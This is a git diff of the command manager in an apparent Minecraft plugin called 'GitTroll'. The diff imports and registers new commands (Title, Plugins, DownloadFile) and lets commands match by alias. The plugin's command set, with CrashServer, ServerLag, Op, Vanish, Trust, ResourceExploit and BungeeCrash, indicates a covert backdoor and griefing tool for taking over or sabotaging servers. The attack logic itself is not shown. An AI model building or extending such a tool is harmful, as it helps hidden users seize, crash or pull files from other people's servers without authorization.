@@ -29,12 +29,15 @@ import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
+import net.Lenni0451.GitTroll.command.commands.player.Title;
 import net.Lenni0451.GitTroll.command.commands.player.Trust;
 import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
 import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
 import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
+import net.Lenni0451.GitTroll.command.commands.server.DownloadFile;
+import net.Lenni0451.GitTroll.command.commands.server.Plugins;
 import net.Lenni0451.GitTroll.command.commands.server.Reload;
 import net.Lenni0451.GitTroll.command.commands.server.ServerLag;
 import net.Lenni0451.GitTroll.command.commands.server.SetSlots;
@@ -84,6 +87,9 @@ public class CommandManager implements Listener {
 	public final BungeeBroadcast BungeeBroadcast = null;
 	public final BungeeCrash BungeeCrash = null;
 	public final BungeePlayerLagger BungeePlayerLagger = null;
+	public final Title Title = null;
+	public final Plugins Plugins = null;
+	public final DownloadFile DownloadFile = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
@@ -136,7 +142,7 @@ public class CommandManager implements Listener {
 		CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
 		
 		for(CommandBase commandBase : this.commands) {
-			if(commandBase.getName().equalsIgnoreCase(commandLabel)) {
+			if(commandBase.getName().equalsIgnoreCase(commandLabel) || commandBase.getAliases().contains(commandLabel)) {
 				Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
 					try {
 						commandBase.execute(cPlayer, new ArrayHelper(args));
